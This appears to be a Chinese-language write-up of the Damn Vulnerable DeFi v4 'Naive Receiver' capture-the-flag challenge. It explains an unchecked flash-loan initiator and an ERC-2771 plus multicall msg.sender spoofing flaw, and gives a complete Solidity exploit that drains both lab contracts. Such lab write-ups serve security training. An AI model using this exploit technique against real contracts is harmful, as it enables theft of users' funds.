# Damn Vulnerable DeFi v4 - native receiver

- https://www.damnvulnerabledefi.xyz/challenges/naive-receiver/

## Check Condition

首先檢查通過的條件：

Player 只能發兩個以下的交易：

```solidity
assertLe(vm.getNonce(player), 2);
```

需要提走 receiver 所以的資金：

```solidity
assertEq(
    weth.balanceOf(address(receiver)),
    0,
    "Unexpected balance in receiver contract"
);
```

需要提走 pool 所以的資金：

```solidity
assertEq(
    weth.balanceOf(address(pool)),
    0,
    "Unexpected balance in pool"
);
```

提走的資金要轉入 recovery：

```solidity
assertEq(
    weth.balanceOf(recovery),
    WETH_IN_POOL + WETH_IN_RECEIVER,
    "Not enough WETH in recovery account"
);
```

## drain receiver (access control)

receiver (FlashLoanReceiver) 的問題是忽略了第一個參數 initiator。這個參數是 flashloan 的發起地址，一般需要檢查 initiator 是否可以發起 flashloan，忽略這個檢查會導致任何人都可以發起 flashloan 並執行 receiver 的 onFlashLoan：

```solidity
function onFlashLoan(address /* initiator */, address token, uint256 amount, uint256 fee, bytes calldata)
    external
    returns (bytes32)
{
    assembly {
        // gas savings
        if iszero(eq(sload(pool.slot), caller())) {
            mstore(0x00, 0x48f5c3ed)
            revert(0x1c, 0x04)
        }
    }
}
```

所以以 player 地址發起 flashloan 到 receiver 數次，就可以透過 flashloan 的手續費抽走 receiver 的所有資金。

## drain pool

ERC-2771 本來是一個為了 meta-transaction 設計的，如果 `msg.sender` 是被信任的地址，則會把 calldata 尾端 20 bytes 的資料作為 `msg.sender`：

```solidity
function _msgSender() internal view override returns (address) {
    if (msg.sender == trustedForwarder && msg.data.length >= 20) {
        return address(bytes20(msg.data[msg.data.length - 20:]));
    } else {
        return super._msgSender();
    }
}
```

但是和 multicall 一塊使用則可以將任意的 20 bytes 的資料作為 `msg.sender`：

```txt
// `++` means bytes concat

[caller = trustedForwarder]
calldata = Multicall.multicall([
  NaiveReceiverPool.withdraw( (WETH_IN_POOL+WETH_IN_RECEIVER), payable(recovery)) ++ address(deployer)
])
```

可以看到 `msg.sender` 是 trustedForwarder，以 multicall 執行 withdraw 時，就會將後面 20 bytes 的資料作為 `msg.sender`。

## solution

```solidity
function test_naiveReceiver() public checkSolvedByPlayer {
    // drain receiver
    bytes[] memory multicallData = new bytes[](10);
    for (uint8 i = 0; i < 10; i++) {
        multicallData[i] = abi.encodeCall(
            NaiveReceiverPool.flashLoan,
            (receiver, address(weth), 1 ether, bytes(""))
        );
    }
    pool.multicall(multicallData);

    // drain pool
    multicallData = new bytes[](1);
    multicallData[0] = abi.encodePacked(
        abi.encodeCall(
            NaiveReceiverPool.withdraw,
            (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))
        ),
        address(deployer)
    );

    BasicForwarder.Request memory req = BasicForwarder.Request({
        from: player,
        target: address(pool),
        value: 0,
        gas: gasleft(),
        nonce: 0,
        data: abi.encodeCall(Multicall.multicall, (multicallData)),
        deadline: block.timestamp
    });

    // // get hash and sign
    bytes32 reqHash = forwarder.getDataHash(req);
    bytes32 digest = keccak256(
        abi.encodePacked("\x19\x01", forwarder.domainSeparator(), reqHash)
    );
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
    forwarder.execute(req, abi.encodePacked(r, s, v));
}
```

## reference

- https://eips.ethereum.org/EIPS/eip-3156#receiver-specification
- https://eips.ethereum.org/EIPS/eip-2771
